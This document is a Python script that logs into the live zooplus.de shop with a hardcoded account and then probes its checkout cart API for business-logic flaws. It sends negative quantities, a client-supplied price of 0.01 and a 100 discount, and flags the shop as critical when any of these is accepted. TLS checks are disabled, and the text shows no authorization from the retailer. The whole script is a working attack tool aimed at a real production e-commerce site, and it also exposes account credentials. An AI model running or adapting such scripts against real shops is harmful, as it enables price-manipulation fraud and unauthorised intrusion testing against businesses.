#!/usr/bin/env python3
"""Verify Business Logic Vulnerabilities"""
import requests
import re
import json
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"
base = "https://www.zooplus.de"
s = requests.Session()
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

# LOGIN
print("[*] Login...")
try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, headers=UA, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    action = m.group(1).replace("&amp;", "&")
    if not action.startswith("http"):
        action = urllib.parse.urljoin(r1.url, action)
    r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, headers=UA, allow_redirects=False, verify=False)
    loc = r2.headers.get("Location", "")
    s.get(loc, headers=UA, allow_redirects=True, verify=False)
    s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", headers=UA, verify=False)
    s.get("https://www.zooplus.de/account/overview", headers=UA, verify=False)
    csrf = s.cookies.get("csrfToken")
    if csrf:
        s.headers.update({"x-csrf-token": csrf, "Accept": "application/json", "Content-Type": "application/json"})
    print("[+] Logged in")
except Exception as e:
    print(f"[!] Login failed: {e}")
    exit(1)

# Get own cart first
print("\n[*] Getting own cart...")
try:
    resp = s.get(f"{base}/checkout/api/cart-api/v2/cart", timeout=5, verify=False)
    if resp.status_code == 200:
        own_cart = resp.json()
        own_cart_uuid = own_cart.get('sid', '')
        print(f"[+] Own cart UUID: {own_cart_uuid[:50]}...")
        
        # Test with own cart first
        endpoint = "/semiprotected/api/checkout/state-api/v2/set-article-quantity"
        
        # Test negative quantity
        print("\n[*] Testing negative quantity...")
        resp = s.put(f"{base}{endpoint}", json={"articleId": 2966422, "quantity": -10}, timeout=5, verify=False)
        if resp.status_code == 200:
            print("  [CRITICAL] Negative quantity accepted!")
            # Check cart
            resp2 = s.get(f"{base}/checkout/api/cart-api/v2/cart/{own_cart_uuid}", timeout=5, verify=False)
            if resp2.status_code == 200:
                cart_after = resp2.json()
                print(f"      Cart total: {cart_after.get('summary', {}).get('grandTotal', 'N/A')}")
        
        # Test zero quantity (should remove item)
        print("\n[*] Testing zero quantity...")
        resp = s.put(f"{base}{endpoint}", json={"articleId": 2966422, "quantity": 0}, timeout=5, verify=False)
        if resp.status_code == 200:
            print("  [OK] Zero quantity accepted (should remove item)")
        
        # Test price manipulation
        print("\n[*] Testing price manipulation...")
        resp = s.put(f"{base}{endpoint}", json={"articleId": 2966422, "quantity": 1, "price": 0.01}, timeout=5, verify=False)
        if resp.status_code == 200:
            print("  [CRITICAL] Price manipulation possible!")
            resp2 = s.get(f"{base}/checkout/api/cart-api/v2/cart/{own_cart_uuid}", timeout=5, verify=False)
            if resp2.status_code == 200:
                cart_after = resp2.json()
                print(f"      Cart total: {cart_after.get('summary', {}).get('grandTotal', 'N/A')}")
        
        # Test discount manipulation
        print("\n[*] Testing discount manipulation...")
        resp = s.put(f"{base}{endpoint}", json={"articleId": 2966422, "quantity": 1, "discount": 100}, timeout=5, verify=False)
        if resp.status_code == 200:
            print("  [CRITICAL] Discount manipulation possible!")
            resp2 = s.get(f"{base}/checkout/api/cart-api/v2/cart/{own_cart_uuid}", timeout=5, verify=False)
            if resp2.status_code == 200:
                cart_after = resp2.json()
                print(f"      Cart total: {cart_after.get('summary', {}).get('grandTotal', 'N/A')}")
        
except Exception as e:
    print(f"[!] Error: {e}")

print("\n[*] Done")

